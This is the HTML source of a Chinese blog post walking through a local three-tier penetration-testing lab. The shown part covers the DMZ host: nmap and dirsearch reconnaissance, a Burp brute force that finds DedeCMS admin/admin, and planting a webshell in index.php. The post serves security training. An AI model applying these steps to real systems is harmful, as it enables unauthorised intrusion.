@@ -1,0 +1,1562 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="安全, 渗透测试, Web安全">
+    
+    
+    <meta name="author" content="W1nner丶">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://tamoon1.github.io/2026/02/02/internal-network-2/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网提权教程——记录某三层网络渗透及综合渗透(socks代理隧道搭建，nacos未授权，redis上传Webshell)">
+<meta property="og:url" content="https://tamoon1.github.io/2026/02/02/Internal-network-2/index.html">
+<meta property="og:site_name" content="W1nner&#39;s Blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tamoon1.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-02-02T10:41:53.000Z">
+<meta property="article:modified_time" content="2026-06-04T02:34:05.605Z">
+<meta property="article:author" content="W1nner丶">
+<meta property="article:tag" content="Internal network penetration">
+<meta property="article:tag" content="内网横向提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tamoon1.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="../../../../images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="../../../../images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            内网提权教程——记录某三层网络渗透及综合渗透(socks代理隧道搭建，nacos未授权，redis上传Webshell) | W1nner丶的博客
+        
+    </title>
+
+    
+<link rel="stylesheet" href="fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="../../../../css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"tamoon1.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"W1nner丶's Studio","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":[{"icon":"fa-brands fa-github","url":null},{"icon":"fa-brands fa-twitter","url":null},{"icon":"fa-solid fa-at","url":"you@example.com"},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2022/8/17 11:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.i18n = {"search":"站内搜索您需要的内容...","toc":"目录","prev":"上一页","next":"下一页","prev_posts":"上一篇","next_posts":"下一篇","page":"第 %d 页","recent_posts":"最新文章","share":"分享","powered_by":"由 %s 驱动","theme":"主题","rss_feed":"RSS Feed","category":"分类","categories":"分类","tag":"标签","tags":"标签","post":"文章","posts":"文章","tagcloud":"标签云","comment":"评论","comments":"评论","top":"置顶","sticky":"置顶","go-back-home":"回到首页","masonry_loading":"照片加载中...","image_viewer":"图片查看器","close":"关闭","exif":{"title":"EXIF","cards":{"camera":"相机","lens":"镜头","exposure":"曝光","other":"其他"},"fields":{"make":"品牌","model":"机型","date_taken":"拍摄时间","lens_model":"镜头","focal_length":"焦距","focus_mode":"对焦模式","shutter":"快门","aperture":"光圈","iso":"感光度","exposure_program":"曝光程序","exposure_compensation":"曝光补偿","metering_mode":"测光模式","flash":"闪光灯","white_balance":"白平衡","latitude":"纬度","longitude":"经度","altitude":"海拔"},"status":{"loading":"加载中...","no_exif":"无 EXIF 信息","library_missing":"EXIF 库未加载","image_source_missing":"图片地址不可用","unavailable":"EXIF 不可用（可能被 CORS 阻止或缺少元数据）","flag_unavailable":"EXIF 不可用"}},"home":"首页","archive":"归档","archives":"归档","about":"关于","links":"链接","link":"链接","friends":"友情链接","friend":"友情链接","timeline":"时间轴","shuoshuo":"说说","bookmarks":"书签","site_uv":"访问人数","site_pv":"总访问量","read_more":"阅读全文","wordcount":"字","min2read":"分钟","changelog":"更新日志","status":"状态","runtime":"博客已运行","days":"天","hours":"小时","minutes":"分钟","seconds":"秒","optimized_by":"并由 Evan 进行优化","rights":"版权所有","site_posts":"共撰写了 %s 篇文章","site_wordcount":"共 %s 字","copyright":{"title":"标题","author":"作者","link":"链接","create_time":"创建于","update_time":"更新于","license_title":"版权声明","license_content":"本文章采用 %s 进行许可。","all_rights_reserved":"版权所有 &#169 %s，禁止转载。","public_domain":"本文为公有领域作品，可自由转载、引用。"},"ago":{"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"},"create_time":"创建","update_time":"更新","expired":"这篇文章最后更新于 %s 天前，内容可能已经过时。"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                W1nner丶的博客
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="../../../../index.html"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="../../../../index.html"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">内网提权教程——记录某三层网络渗透及综合渗透(socks代理隧道搭建，nacos未授权，redis上传Webshell)</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="../../../../images/touxiang.jpeg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">W1nner丶</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-02-02 18:41:53</span>
+        <span class="mobile">2026-02-02 18:41:53</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-06-04 10:34:05</span>
+            <span class="mobile">2026-06-04 10:34:05</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="../../../../categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/">技术分享</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="../../../../tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%8F%90%E6%9D%83/">内网横向提权</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="../../../../tags/Internal-network-penetration/">Internal network penetration</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>本次我们以三层网络渗透(三设备)，在本地复现其渗透测试及内网渗透的知识点，本次学习内容包含(信息收集、信息泄露、代码审计流程、后台漏洞、专项漏洞训练、组合拳webshell、主机漏洞等)；</p>
+</blockquote>
+<hr>
+<h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><p>本次我们以三层网络渗透(三设备)，在本地复现其渗透测试及内网渗透的知识点。同时，本次学习内容包含(信息收集、信息泄露、代码审计流程、后台漏洞、专项漏洞训练、组合拳webshell、主机漏洞等)：</p>
+<p><code>网络拓扑结构</code>如图：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="89205d4610a04e368d94c802ab07adab.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>环境及所需工具下载地址：<a class="link"   target="_blank" rel="noopener" href="https://pan.quark.cn/s/9de384312d0f" >https://pan.quark.cn/s/9de384312d0f<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>（请确保安装盘硬盘容量大于15G）</p>
+<p>本次靶场以及WP版权作者：<strong><code>州弟学安全</code></strong></p>
+<ul>
+<li>本次文章仅为本地学习复现，请勿对外进行互联网未授权攻击，造成的后果自行承担</li>
+<li><strong>内容中若涉及侵权素材，敬请版权方及时联系，我方将第一时间删除并妥善处理</strong></li>
+</ul>
+<hr>
+<h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p>本环境模拟了一个包含DMZ区、二层网络和三层网络的多层内网渗透场景。</p>
+<ul>
+<li>DMZ (Layer 1): Windows Server (192.168.44.176 &#x2F; 10.10.10.22)，运行 DedeCMS (8080端口) 和 FTP (21端口)。</li>
+<li>Layer 2: Linux (10.10.10.23 &#x2F; 10.10.20.11)，运行 <code>Nginx</code> (80端口, 含phpinfo)、<code>Redis</code> (6379端口) 和 <code>Nacos</code> (8848端口)。</li>
+<li>Layer 3: Windows 7 (10.10.20.12)，存在 MS17-010 漏洞。<ul>
+<li><strong>（这里的Windows7是我自己配的，因为作者给的文件并没有）</strong></li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>公网网段：192.168.44.0&#x2F;24<br>一层内网网段：10.10.10.0&#x2F;24<br>二层内网网段：10.10.20.0&#x2F;24</p>
+</blockquote>
+<p>该环境用于演练多层内网环境下的横向移动和代理搭建技术，包括：</p>
+<ul>
+<li>信息收集与漏洞利用（DedeCMS文件上传、Nacos未授权、Redis写Webshell、MS17-010）。</li>
+<li>多级代理搭建与应用（FRP、proxychains、Proxifier）。</li>
+<li>代码审计基础（定位文件上传漏洞）。</li>
+<li>跨网段扫描与渗透。</li>
+</ul>
+<blockquote>
+<p><strong>DMZ</strong>: <code>administrator/P@ssw0rd1</code><br><strong>Layer 2</strong>: <code>dmz/P@ssw0rd2</code><br><strong>Layer 3</strong>: <code>pro/P@ssw0rd3</code></p>
+<hr>
+<p>任务要求：<br>（1）拿下DMZ区设备后获取DMZ区administrator桌面下flag文件值<br>（2）拿下二层网络设备获取某服务内的flag<br>（3）拿下二层网络设备后获取根目录下flag文件值<br>（4）拿下三层网络设备后获取pro用户桌面下的flag文件值</p>
+</blockquote>
+<p>话不多说，直接开始；</p>
+<h2 id="DMZ主机渗透"><a href="#DMZ主机渗透" class="headerlink" title="DMZ主机渗透"></a>DMZ主机渗透</h2><h3 id="探测服务以及端口"><a href="#探测服务以及端口" class="headerlink" title="探测服务以及端口"></a>探测服务以及端口</h3><p>首先我们直到DMZ主机的网段为<code>192.168.44.0/24</code> ，所以我们可以对该网段就行扫描，看看目标主机的具体IP地址是多少：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 网段扫描</span></span><br><span class="line">nmap -sP 192.168.44.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细信息收集</span></span><br><span class="line">nmap -sC -sV -A -p- 192.168.44.176</span><br></pre></td></tr></table></figure></div>
+<p>发现目标主机IP地址为<code>192.168.44.176</code></p>
+<p>接下来我们看其开放了哪些<strong>服务以及端口</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="0fa933c3dcc54181b1f6a80c487a549f.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>得到结果：</p>
+<ul>
+<li>21端口：FTP服务（文件传输）</li>
+<li>135端口：MSRPC服务（进程通信）</li>
+<li>139端口：NetBIOS-SSN（文件共享）</li>
+<li>445端口：<code>SMB服务</code>（文件共享）</li>
+<li>3306端口：<code>MySQL服务</code>（数据库）</li>
+<li>5357端口：HTTPAPI（设备发现）</li>
+<li>5985端口：WinRM服务（远程管理）</li>
+<li>8080端口：<code>Nginx服务</code>（Web服务）</li>
+</ul>
+<p>这里我为大家列出几个常见漏洞的端口服务，我们接下来就对该主机进行详细的漏洞探测；</p>
+<h3 id="DedcCMS信息收集"><a href="#DedcCMS信息收集" class="headerlink" title="DedcCMS信息收集"></a>DedcCMS信息收集</h3><p>我们输入网址<a class="link"   target="_blank" rel="noopener" href="http://192.168.44.176:8080/%EF%BC%8C%E5%8F%91%E7%8E%B0%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E7%9A%84%E6%98%AF%E4%B8%80%E4%B8%AA%E5%BE%88%E5%B8%B8%E7%94%A8%E7%9A%84DedeCMS%E6%A1%86%E6%9E%B6%EF%BC%9A" >http://192.168.44.176:8080/，发现网站搭建的是一个很常用的DedeCMS框架：<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="20d54a169dca448ca9a57d525b0a50bb.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<blockquote>
+<p><strong>DedeCMS</strong> 是国内早期非常流行的PHP 开源内容管理系统（CMS），以开源免费、模板丰富、上手简单著称，曾被广泛用于搭建企业官网、资讯站、博客等各类网站。<br>但由于官方后续维护基本停滞，且代码遗留了大量历史安全问题，目前已成为渗透测试中常见的<strong>高危目标</strong>。</p>
+<hr>
+<p>常见的<code>高危漏洞</code>：</p>
+<ul>
+<li>SQL 注入漏洞：多处参数未做严格过滤，攻击者可构造恶意 SQL 语句，窃取数据库信息甚至控制服务器。</li>
+<li>文件上传漏洞：上传模块对文件类型、内容校验不严，允许上传恶意 PHP 脚本，直接获取服务器权限。</li>
+<li>后台弱口令 &#x2F; 默认账号：很多站点使用默认账号（如admin&#x2F;admin）或弱密码，易被暴力破解进入后台。</li>
+<li>任意文件读取 &#x2F; 删除：部分功能点未校验文件路径，可读取服务器敏感文件（如&#x2F;etc&#x2F;passwd）或删除关键文件。</li>
+<li>代码执行漏洞：部分功能存在变量覆盖、函数滥用问题，可被构造恶意请求执行任意代码。<br>（不同版本存在漏洞不一样；）</li>
+</ul>
+</blockquote>
+<p>所以我们接下来需要知道<strong>搭建的版本</strong>是多少：</p>
+<p>在网页底部可以得到结果：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="a8f41ecb207345a995d7182f992d06e1.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>去网上搜索相应的漏洞：<strong>DedeCMS_V57_UTF8_SP2</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="1527545cb5ed4918a0aabf3f245ca01e.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>找漏洞的出现原因涉及到<strong>代码审计</strong>，这里我就不讲了，网上有很多好的文章大家可以去看看；</p>
+<p>这里我们对该网站进行<code>Web目录扫描</code>：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://192.168.44.176:8080/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除404，403页面</span></span><br><span class="line">python dirsearch.py -u http://192.168.44.176:8080/ -x 404,403</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保留相应的页面</span></span><br><span class="line">python dirsearch.py -u http://192.168.44.176:8080/ -i 200,301</span><br></pre></td></tr></table></figure></div>
+<p>得到结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="c5ab0d706d4d4a8b9f85d5221bf36e6e.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="06cbe27c597641c6854211ac6c5be226.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>根据结果，访问<a class="link"   target="_blank" rel="noopener" href="http://192.168.44.176:8080/**install**/%EF%BC%8C%E8%BF%94%E5%9B%9E%E4%BA%86%E4%B8%80%E4%B8%AA%60dir%60%EF%BC%9F" >http://192.168.44.176:8080/**install**/，返回了一个`dir`？<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="81463e33b1af420d847c30023b8ad3aa.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://192.168.44.176:8080/**uploads" >http://192.168.44.176:8080/**uploads<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>** 的结果与&#x2F;install 也是一样的；</p>
+<p>随后访问：<a class="link"   target="_blank" rel="noopener" href="http://192.168.44.176:8080/**member" >http://192.168.44.176:8080/**member<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>**</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="915e8edd20d146c6a4f59a02a287e56b.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="DedeCMS上传shell"><a href="#DedeCMS上传shell" class="headerlink" title="DedeCMS上传shell"></a>DedeCMS上传shell</h3><blockquote>
+<p><strong>思路</strong>：</p>
+<ul>
+<li>现进行了身份验证，所以我们只能尝试先<strong>登陆系统</strong>，再上传文件；<br>如果失败，<strong>弱口令爆破</strong>，再上传文件；</li>
+</ul>
+</blockquote>
+<p>于是我们尝试创建一个账号登陆：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="0c0b323f97ee4db7ba47b156d4dc15b1.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>发现失败了，那只能<code>弱口令爆破</code>了：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="93a4e83a59f1464c9cdee9583197bea7.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>打开bp抓包，输入我们的字典：</p>
+<p>在后台登陆界面：<code>http://192.168.44.176:8080/dede/login.php</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="41a0e3c2283744889c10b5dc93686353.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="5bb49602730447e88fc388c3622f27c8.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>得到结果：<code>admin</code> &#x2F; <code>admin</code> </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="5453d929ef1443f2a0f1e8822477993d.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>既然进入到系统内部了，我们直接在里面添加<strong>一句话木马</strong>即可：</p>
+<h4 id="方法一：在前台模块上传木马"><a href="#方法一：在前台模块上传木马" class="headerlink" title="方法一：在前台模块上传木马"></a>方法一：在前台模块上传木马</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="9af8fe83bab1420c880d9917bb4065b3.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="430fc958a5f04fc78002c395f3ca29f6.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p><strong>蚁剑</strong>连接也是成功的：（用冰蝎，哥斯拉等都可以，看个人）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="d0ca5da230034faab7710c41aeb50dee.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<blockquote>
+<p>这里为什么不添加一个新的php文件呢？</p>
+<ul>
+<li>因为我们不知道添加到新文件在公网的具体路径(也就是<a class="link"   target="_blank" rel="noopener" href="http://xx.xx./123.php)%E5%9C%A8%E5%93%AA%E9%87%8C%EF%BC%9B" >http://xx.xx./123.php)在哪里；<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li>所以这里我选择上传到<strong>index.php</strong>里，方便快捷；</li>
+</ul>
+</blockquote>
+<h4 id="方法二：发布文章上传php文件（失败）"><a href="#方法二：发布文章上传php文件（失败）" class="headerlink" title="方法二：发布文章上传php文件（失败）"></a>方法二：发布文章上传php文件（失败）</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="e702716aa93d4d72baa1ca3dd56e88a0.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>上传一个图片马或图片，绕过前端mime验证，写入一句话木马，可以看到路由正是我们审计的前端调用文件：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="3c6c3c5f2541405499667aa094296259.png"
+                      alt="在这里插入图片描述"
